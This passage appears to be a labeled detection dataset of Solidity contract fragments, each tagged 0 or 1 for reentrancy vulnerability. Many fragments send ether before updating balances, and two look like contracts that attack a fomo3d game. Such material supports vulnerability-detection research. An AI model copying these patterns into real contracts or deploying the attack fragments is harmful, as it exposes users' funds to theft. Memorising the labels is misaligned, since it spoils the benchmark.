startDatetime = startDatetimeInSeconds;
endDatetime = startDatetime + 16 * 1 days;
function() public payable {
buy(msg.sender);
0
---------------------------------
96 39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
97 37891.sol
function claim() {
uint balance = balances[msg.sender];
require(balance > 0);
balances[msg.sender] = 0;
bool claimed = msg.sender.call.value(balance)();
require(claimed);
0
---------------------------------
98 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback) public returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
99 17215.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public isRunning returns (bool ok) {
require(compatible223ex);
require(isUnlockedBoth(_to));
require(balances[msg.sender] >= _value);
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
if (isContract(_to)) {
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
0
---------------------------------
100 1044.sol
function donateToWhale(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Donate(amount, whale, msg.sender);
function loseWager(uint256 amount) internal {
whale.call.value(amount)(bytes4(keccak256("donate()")));
totalDonated += amount;
emit Lose(amount, msg.sender);
1
---------------------------------
101 39705.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
102 856.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
emit Execution(transactionId);
else {
emit ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
103 16057.sol
function callFirstTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
firstTarget.call.value(msg.value)();
function callSecondTarget () public payable onlyPlayers {
require (msg.value >= 0.005 ether);
secondTarget.call.value(msg.value)();
function winPrize() public payable onlyOwner {
owner.call.value(1 wei)();
0
---------------------------------
104 842.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
require(_value > 0 && frozenAccount[msg.sender] == false && frozenAccount[_to] == false && now > unlockUnixTime[msg.sender] && now > unlockUnixTime[_to]);
if (isContract(_to)) {
require(balanceOf[msg.sender] >= _value);
balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
balanceOf[_to] = balanceOf[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
105 19402.sol
function buyToken(address recipient, uint256 value) internal {
if (block.number<startBlock || block.number>endBlock) throw;
uint tokens = safeMul(value, price());
if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw;
balances[recipient] = safeAdd(balances[recipient], tokens);
crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens);
totalSupply = safeAdd(totalSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
function price() constant returns(uint) {
if (block.number<startBlock || block.number > endBlock) return 0;
else  return crowdSalePrice;
function() public payable {
if(msg.value == 0) {
sendCandy(msg.sender);
}  else {
buyToken(msg.sender, msg.value);
0
---------------------------------
106 668.sol
function call(address _to, bytes memory _data) public payable onlyWhitelistAdmin {
require(_to != address(registrar));
(bool success,) = _to.call.value(msg.value)(_data);
require(success);
0
---------------------------------
107 cross-function-reentrancy-fixed.sol
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {throw;}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
0
---------------------------------
108 23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
109 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
110 21755.sol
function Collect(uint _am) public payable {
var acc = Acc[msg.sender];
if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {
if(msg.sender.call.value(_am)())  {
acc.balance-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Put(0);
1
---------------------------------
111 21999.sol
function call(address addr, bytes data, uint256 amount) public payable onlyOwner {
if (msg.value > 0)
deposit();
require(addr.call.value(amount)(data));
Call(msg.sender, addr, amount);
0
---------------------------------
112 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
113 39866.sol
function funding() payable {
if(fundingLock||block.number<startBlock||block.number>startBlock+blockDuration) throw;
if(balances[msg.sender]>balances[msg.sender]+msg.value*fundingExchangeRate || msg.value>msg.value*fundingExchangeRate) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*fundingExchangeRate;
Funding(msg.sender,msg.value);
function buy(string _commit) payable{
if(balances[msg.sender]>balances[msg.sender]+msg.value*price || msg.value>msg.value*price) throw;
if(!fundingAccount.call.value(msg.value)()) throw;
balances[msg.sender]+=msg.value*price;
commit[msg.sender]=_commit;
Buy(msg.sender,msg.value);
1
---------------------------------
114 SendBalance.sol
function withdrawBalance(){
if(!(msg.sender.call.value(userBalances[msg.sender])())) {throw;}
userBalances[msg.sender] = 0;
1
---------------------------------
115 40341.sol
function carefulSendWithFixedGas(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(address fromAddress, address toAddress, uint valueWei);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal {
if (msg.value != 0) { throw; }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) { throw; }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(_toAddress, _valueWei, _extraGasIncluded);
if (!sentOk) { throw; }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends);
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
0
---------------------------------
116 30301.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender)
confirmed(transactionId, msg.sender)
notExecuted(transactionId)
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId)
notConfirmed(transactionId, msg.sender)
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
117 14274.sol
function withdraw(uint _amount) {
require(tokens[0][msg.sender] >= _amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], _amount);
if (!msg.sender.call.value(_amount)()) {
revert();
Withdraw(0, msg.sender, _amount, tokens[0][msg.sender]);
function instantTrade(address _tokenGet, uint _amountGet, address _tokenGive, uint _amountGive, uint _expires, uint _nonce, address _user, uint8 _v, bytes32 _r, bytes32 _s, uint _amount, address _store) payable {
uint totalValue = safeMul(_amount, 1004) / 1000;
if (_tokenGet == address(0)) {
if (msg.value != totalValue) {
revert();
TokenStore(_store).deposit.value(totalValue)();
} else {
if (!Token(_tokenGet).transferFrom(msg.sender, this, totalValue)) {
revert();
if (!Token(_tokenGet).approve(_store, totalValue)) {
revert();
TokenStore(_store).depositToken(_tokenGet, totalValue);
TokenStore(_store).trade(_tokenGet, _amountGet, _tokenGive, _amountGive,
_expires, _nonce, _user, _v, _r, _s, _amount);
totalValue = TokenStore(_store).balanceOf(_tokenGive, this);
uint customerValue = safeMul(_amountGive, _amount) / _amountGet;
if (_tokenGive == address(0)) {
TokenStore(_store).withdraw(totalValue);
msg.sender.transfer(customerValue);
} else {
TokenStore(_store).withdrawToken(_tokenGive, totalValue);
if (!Token(_tokenGive).transfer(msg.sender, customerValue)) {
revert();
0
---------------------------------
118 34577.sol
function executeTransaction(bytes32 transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (!txn.destination.call.value(txn.value)(txn.data))
revert();
Execution(transactionId);
function confirmTransaction(bytes32 transactionId) public ownerExists(msg.sender) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
119 39912.sol
function simulatePathwayFromBeneficiary() public payable {
bytes4 buySig = bytes4(sha3("buy()"));
if (!Resilience.call.value(msg.value)(buySig)) throw;
bytes4 transferSig = bytes4(sha3("transfer(address,uint256)"));
if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;
0
---------------------------------
120 14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
121 1710.sol
function buyFST0(address receiver) internal {
require(salesPipe.call.value(msg.value)());
uint256 tmpERCBalance = erc.balanceOf(address(this));
uint256 tmpEthBalance = address(this).balance;
if (tmpERCBalance > 0) {
require(erc.transfer(receiver, tmpERCBalance)); }
if (tmpEthBalance > 0) {
require(receiver.send(tmpEthBalance));
function buyFST (address receiver) public payable {
buyFST0(receiver);
function buyFST () public payable {
buyFST0(msg.sender);
function () external payable {
buyFST0(msg.sender);
0
---------------------------------
122 40357.sol
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
function split(address ethDestination, address etcDestination) {
if (amIOnTheFork.forked()) {
ethDestination.call.value(msg.value)();
} else {
uint fee = msg.value / 100;
feeRecipient.send(fee);
etcDestination.call.value(msg.value - fee)();
0
---------------------------------
123 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
124 40425.sol
function BankOwner_WithdrawDonations() public modifier_isContractOwner() modifier_wasValueSent() {
if (_bankDonationsBalance > 0) {
uint256 amount_ = _bankDonationsBalance;
_bankDonationsBalance = 0;
if (msg.sender.send(amount_)) {
event_bankDonationsWithdrawn(amount_);
}  else if (msg.sender.call.value(amount_)()) {
event_bankDonationsWithdrawn(amount_);
}  else {
_bankDonationsBalance = amount_;
function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount) {
_bankAccountsArray[accountNumber_].balance -= amount;
if (msg.sender.send(amount)) {
withdrawalSuccessful_ = true;
else if (msg.sender.call.value(amount)()) {
withdrawalSuccessful_ = true;
}  else {
_bankAccountsArray[accountNumber_].balance += amount;
if (withdrawalSuccessful_) {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount);
return true;
}  else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount);
return false;
function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount() modifier_wasValueSent() returns (bool) {
bool withdrawalSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
uint256 fullBalance_ = 0;
if (_bankAccountsArray[accountNumber_].balance > 0) {
fullBalance_ = _bankAccountsArray[accountNumber_].balance;
_bankAccountsArray[accountNumber_].balance = 0;
if (msg.sender.send(fullBalance_)) {
withdrawalSuccessful_ = true;
}else
if (msg.sender.call.value(fullBalance_)()) {
withdrawalSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance = fullBalance_;
if (withdrawalSuccessful_)  {
event_withdrawalMadeFromBankAccount_Successful(accountNumber_, fullBalance_);
return true;
} else {
event_withdrawalMadeFromBankAccount_Failed(accountNumber_, fullBalance_);
return false;
function TransferAmountFromBankAccountToAddress(uint256 amount, address destinationAddress) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) {
bool transferSuccessful_ = false;
uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber;
if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount) {
_bankAccountsArray[accountNumber_].balance -= amount;
if (destinationAddress.send(amount)) {
transferSuccessful_ = true;
} else if (destinationAddress.call.value(amount)()) {
transferSuccessful_ = true;
} else {
_bankAccountsArray[accountNumber_].balance += amount;
if (transferSuccessful_) {
event_transferMadeFromBankAccountToAddress_Successful(accountNumber_, amount, destinationAddress);
return true;
} else {
event_transferMadeFromBankAccountToAddress_Failed(accountNumber_, amount, destinationAddress);
return false;
0
---------------------------------
125 30101.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
126 39326.sol
function executeProposal( uint256 id, bytes transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode)) throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
0
---------------------------------
127 22074.sol
function Collect(uint _am) public payable {
if(Bal[msg.sender]>=MinSum && _am<=Bal[msg.sender]) {
msg.sender.call.value(_am);
Bal[msg.sender]-=_am;
1
---------------------------------
128 2387.sol
function transferAndCall(address to, uint256 value, bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 && transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
129 21390.sol
function FundTransfer(uint _am, bytes32 _operation, address _to, address _feeToAdr) payable {
if(msg.sender != address(this)) throw;
if(_operation=="In")   {
FundsMove(msg.value,"In",_to);
investors[_to] += _am;
}  else {
uint amTotransfer = 0;
if(_to==_feeToAdr) {
amTotransfer=_am;
}  else {
amTotransfer=_am/100*99;
investors[_feeToAdr]+=_am-amTotransfer;
if(_to.call.value(_am)()==false) throw;
investors[_to] -= _am;
FundsMove(_am, "Out", _to);
function() payable {
In(msg.sender);
function Out(uint amount) payable {
if(investors[msg.sender]<targetAmount)throw;
if(investors[msg.sender]<amount)throw;
this.FundTransfer(amount,"",msg.sender,admin);
function In(address to) payable {
if(to==0x0)to = admin;
if(msg.sender!=tx.origin)throw;
this.FundTransfer(msg.value, "In", to,admin);
1
---------------------------------
130 16925.sol
function withdraw() public{
assert(msg.sender.call.value(balances[msg.sender])()) ;
balances[msg.sender] = 0;
1
---------------------------------
131 3270.sol
function gotake() public {
if (fomo3d.getTimeLeft() > 50) { revert(); }
address(fomo3d).call.value(fomo3d.getBuyPrice() *2 )();
fomo3d.withdraw();
0
---------------------------------
132 5629.sol
constructor () public payable {
fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
(,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
require(winnings > 0.1 ether);
fomo.withdraw();
selfdestruct(msg.sender);
0
---------------------------------
133 4679.sol
function giveToken(address _buyer) internal {
require( pendingTokenUser[_buyer] > 0, "pendingTokenUser[_buyer] > 0" );
tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]);
tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]);
soldTokens = soldTokens.add(pendingTokenUser[_buyer]);
pendingTokenUser[_buyer] = 0;
require( address(tokenSaleContract).call.value( etherUser[_buyer] )(bytes4( keccak256("forwardEther()"))));
etherUser[_buyer] = 0;
function forwardEther() onlyRC payable public returns(bool) {
require(milestoneSystem.call.value(msg.value)(), "wallet.call.value(msg.value)()");
return true;
1
---------------------------------
134 30460.sol
function close() onlyOwner public {
require(state == State.Active);
state = State.Closed;
Closed();
wallet.call.value(this.balance)();
function forwardFunds() onlyOwner public {
require(this.balance > 0);
wallet.call.value(this.balance)();
contract FinalizableCrowdsale is BurnableCrowdsale, Ownable {
using SafeMath for uint256;
bool public isFinalized = false;
event Finalized();
function forwardFundsToWallet(uint256 amount) internal {
if (goalReached() && vault.balance > 0) {
vault.forwardFunds();
if (goalReached()) {
wallet.call.value(amount)();
} else {
vault.deposit.value(amount)(msg.sender);
0
---------------------------------
135 9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
136 39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else
if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
address public seriesFactory;
address public owner;
0
---------------------------------
137 40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
138 27486.sol
function Command(address adr,bytes data) payable public {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
139 23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
140 17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
141 26188.sol
function GetPrizeFund() public payable {
require(now>EndTime);
require(Bids[msg.sender]>=MaxOffer);
uint prizeAmount = Bids[msg.sender]+PrizeFund;
PrizeFund = 0;
Bids[msg.sender]=0;
msg.sender.call.value(prizeAmount);
function RevokeBid() public payable {
require(now>EndTime);
uint toTransfer = Bids[msg.sender];
Bids[msg.sender]=0;
msg.sender.call.value(toTransfer);
0
---------------------------------
142 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
143 39269.sol
function sendPending() public preventReentry isHolder(msg.sender) returns (bool){
if (ptxTail == ptxHead) return false;
TX memory tx = pendingTxs[ptxTail];
if(now < tx.timeLock) return false;
delete pendingTxs[ptxTail++];
if(!tx.blocked) {
if(tx.to.call.value(tx.value)(tx.data)) {
committedEther -= tx.value;
Withdrawal(tx.from, tx.to, tx.value);
return true;
if (tx.from == address(this)) {
committedEther -= tx.value;
} else {
holders[tx.from].etherBalance += tx.value;
TransactionFailed(tx.from, tx.to, tx.value);
return false;
0
---------------------------------
144 1879.sol
function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin {
_upgradeTo(newImplementation);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
145 2021.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _safeSend(address _to, uint _value) internal {
if (!_unsafeSend(_to, _value)) {
throw;
0
---------------------------------
146 36563.sol
function forward(address _destination, uint256 _value, bytes _data) onlyOwner {
require(_destination != address(0));
assert(_destination.call.value(_value)(_data));
if (_value > 0) {
Withdrawal(_destination, _value, _data);
function() payable {
Deposit(msg.sender, msg.value);
0
---------------------------------
147 39644.sol
function revoke(address transactor, address transactee) {
if (msg.sender != transactor && msg.sender != transactee) { throw; }
if(!verify(transactor, transactee)) { throw; }
uint32 deposit = _verifications[transactor][transactee];
delete _verifications[transactor][transactee];
if (!transactee.call.value(deposit).gas(23000)()) {  throw;  }
RevokeEvent(transactor, transactee, deposit);
0
---------------------------------
148 27334.sol
function participate() payable {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == luckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
149 23387.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId){
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
150 24007.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
151 11719.sol
function Collect(uint _am) public payable {
if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {
if(msg.sender.call.value(_am)())  {
balances[msg.sender]-=_am;
Log.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Deposit();
1
---------------------------------
152 28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
153 35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
154 39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
155 3985.sol
function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable {
require(this == target);
bytes memory prefix = "\x19Ethereum Signed Message:\n32";
bytes32 hash = keccak256(prefix, keccak256(target, data, nonce));
msgSender = ECRecovery.recover(hash, sig);
require(msgSender == sender);
require(nonces[msgSender]++ == nonce);
require(target.call.value(msg.value)(data));
msgSender = address(0);
0
---------------------------------
156 347.sol
function _forwardFunds() internal {
bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();
emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone);
0
---------------------------------
157 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
158 simple_dao_fixed.sol
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
1
---------------------------------
159 18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
160 970.sol
function withdraw(uint amount) {
if (tokens[0][msg.sender] < amount) throw;
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
if (!msg.sender.call.value(amount)()) throw;
